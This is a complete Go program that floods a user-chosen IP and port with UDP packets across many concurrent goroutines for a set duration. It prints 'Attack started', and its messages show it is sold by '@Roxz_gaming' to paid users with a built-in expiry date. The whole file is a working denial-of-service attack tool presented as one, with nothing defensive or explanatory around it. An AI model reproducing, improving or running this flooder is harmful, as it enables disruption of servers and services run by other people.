package main

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"
)

const (
	BUFFER_SIZE      = 900
	EXPIRATION_YEAR  = 2025
	EXPIRATION_MONTH = 1
	EXPIRATION_DAY   = 1
)

var (
	ip       string
	port     int
	duration int
	stopFlag = make(chan bool)
)

func checkExpiration() {
	expirationDate := time.Date(EXPIRATION_YEAR, time.Month(EXPIRATION_MONTH), EXPIRATION_DAY, 0, 0, 0, 0, time.UTC)
	if time.Now().After(expirationDate) {
		fmt.Fprintf(os.Stderr, "This file is closed by @Roxz_gaming.\n")
		os.Exit(1)
	}
}

func sendUDPTraffic(wg *sync.WaitGroup, userID int) {
	defer wg.Done()

	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Fprintf(os.Stderr, "User %d: Failed to create socket: %v\n", userID, err)
		return
	}
	defer conn.Close()

	buffer := []byte("UDP traffic test")
	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	// Use a buffered channel to limit concurrency
	packetChannel := make(chan struct{}, 100) // Adjust the buffer size as necessary
	for i := 0; i < cap(packetChannel); i++ {
		packetChannel <- struct{}{}
	}

	for time.Now().Before(endTime) {
		select {
		case <-stopFlag:
			return
		default:
			// Batch send packets
			for i := 0; i < 10; i++ { // You can experiment with this number
				<-packetChannel // Wait for an available spot in the channel
				go func() {
					_, err := conn.Write(buffer)
					packetChannel <- struct{}{} // Release the spot in the channel
					if err != nil {
						fmt.Fprintf(os.Stderr, "User %d: Send failed: %v\n", userID, err)
					}
				}()
			}
		}
	}
}

func expirationCheckThread() {
	for {
		select {
		case <-stopFlag:
			return
		default:
			checkExpiration()
			time.Sleep(1 * time.Hour)
		}
	}
}

func signalHandler(sigChan chan os.Signal) {
	<-sigChan
	close(stopFlag)
}

func main() {
	if len(os.Args) != 5 {
		fmt.Fprintf(os.Stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", os.Args[0])
		os.Exit(1)
	}

	ip = os.Args[1]
	port, _ = strconv.Atoi(os.Args[2])
	duration, _ = strconv.Atoi(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[4])

	checkExpiration()

	// Print attack parameters
	fmt.Printf("Attack started\n")
	fmt.Printf("IP: %s\n", ip)
	fmt.Printf("PORT: %d\n", port)
	fmt.Printf("TIME: %d seconds\n", duration)
	fmt.Printf("THREADS: %d\n", threads)
	fmt.Printf("File is made by @Roxz_gaming only for paid users.\n")

	var wg sync.WaitGroup
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go signalHandler(sigChan)

	go expirationCheckThread()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go sendUDPTraffic(&wg, i) // Pass user ID to identify each client
	}

	wg.Wait()
}
